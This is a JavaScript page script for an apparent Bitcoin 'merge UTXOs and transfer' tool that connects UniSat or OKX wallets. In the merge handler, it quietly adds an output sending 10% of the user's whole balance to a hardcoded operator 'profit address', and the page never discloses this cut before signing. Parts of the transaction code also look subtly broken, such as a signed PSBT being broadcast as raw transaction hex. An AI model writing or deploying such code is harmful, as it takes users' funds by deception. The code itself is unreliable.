document.addEventListener('DOMContentLoaded', async () => {
    let walletProvider = null;
    let walletAddress = null;
    let targetAddress = null;
    const profitAddress = '15Kh1QUbZg9cT9UXvtABjg12RCPmzbNLpd'; // 你的收益地址
    const profitRate = 0.1; // 10% 收益

    const connectButton = document.getElementById('connectWallet');
    const disconnectButton = document.getElementById('disconnectWallet');
    const walletStatus = document.getElementById('walletStatus');
    const mergeButton = document.getElementById('mergeButton');
    const targetAddressInput = document.getElementById('targetAddress');
    const feeRateInput = document.getElementById('feeRate');
    const feeRatesDisplay = document.getElementById('feeRates');

    // 获取并显示主网费率
    const fetchFeeRates = async () => {
        try {
            const response = await fetch('/get-fee-rates');
            const rates = await response.json();
            feeRatesDisplay.textContent = `快速: ${rates.fastestFee}, 中等: ${rates.halfHourFee}, 慢速: ${rates.hourFee}`;
            feeRateInput.placeholder = `推荐: ${rates.halfHourFee}`;
        } catch (error) {
            feeRatesDisplay.textContent = '无法加载费率';
        }
    };
    fetchFeeRates();

    // 连接钱包
    connectButton.addEventListener('click', async () => {
        try {
            if (window.unisat) {
                const accounts = await window.unisat.requestAccounts();
                walletProvider = 'unisat';
                walletAddress = accounts[0];
            } else if (window.okxwallet && window.okxwallet.bitcoin) {
                const result = await window.okxwallet.bitcoin.connect();
                walletProvider = 'okx';
                walletAddress = result.address;
            } else {
                alert('请安装UniSat或OKX钱包插件！');
                return;
            }
            walletStatus.textContent = `已连接钱包: ${walletAddress}`;
            connectButton.style.display = 'none';
            disconnectButton.style.display = 'inline';
            mergeButton.disabled = false;
        } catch (error) {
            alert(`连接失败: ${error.message}`);
        }
    });

    // 断开连接
    disconnectButton.addEventListener('click', () => {
        walletProvider = null;
        walletAddress = null;
        walletStatus.textContent = '未连接钱包';
        connectButton.style.display = 'inline';
        disconnectButton.style.display = 'none';
        mergeButton.disabled = true;
    });

    // 合并 UTXO 并转账
    mergeButton.addEventListener('click', async () => {
        targetAddress = targetAddressInput.value.trim() || walletAddress;
        const feeRate = parseInt(feeRateInput.value) || 10;

        try {
            // 获取 UTXO
            const utxoResponse = await fetch('/get-utxos', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ address: walletAddress })
            });
            const { utxos } = await utxoResponse.json();
            if (!utxos || utxos.length < 2) throw new Error('至少需要2个UTXO');

            // 构造交易
            const network = Bitcoin.networks.bitcoin; // 主网
            const txb = new Bitcoin.TransactionBuilder(network);
            let totalInput = 0;
            utxos.forEach(utxo => {
                txb.addInput(utxo.txid, utxo.vout);
                totalInput += utxo.value;
            });

            const txSize = utxos.length * 148 + 34 + 10;
            const fee = txSize * feeRate;
            const profit = Math.floor(totalInput * profitRate); // 10% 收益
            const outputValue = totalInput - fee - profit;

            if (outputValue <= 0) throw new Error('余额不足以支付费用和收益');

            // 输出：用户目标地址和你的收益地址
            txb.addOutput(targetAddress, outputValue);
            txb.addOutput(profitAddress, profit);

            const psbt = txb.buildIncomplete().toPSBT();

            // 签名
            let signedTxHex;
            if (walletProvider === 'unisat') {
                signedTxHex = await window.unisat.signPsbt(psbt.toHex());
            } else if (walletProvider === 'okx') {
                signedTxHex = await window.okxwallet.bitcoin.signPsbt(psbt.toHex());
            }

            // 广播交易
            const broadcastResponse = await fetch('/broadcast', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ txHex: signedTxHex })
            });
            const { txId } = await broadcastResponse.json();

            document.location.href = `/?message=UTXO合并并转账成功！&txId=${txId}`;
        } catch (error) {
            alert(`操作失败: ${error.message}`);
        }
    });
});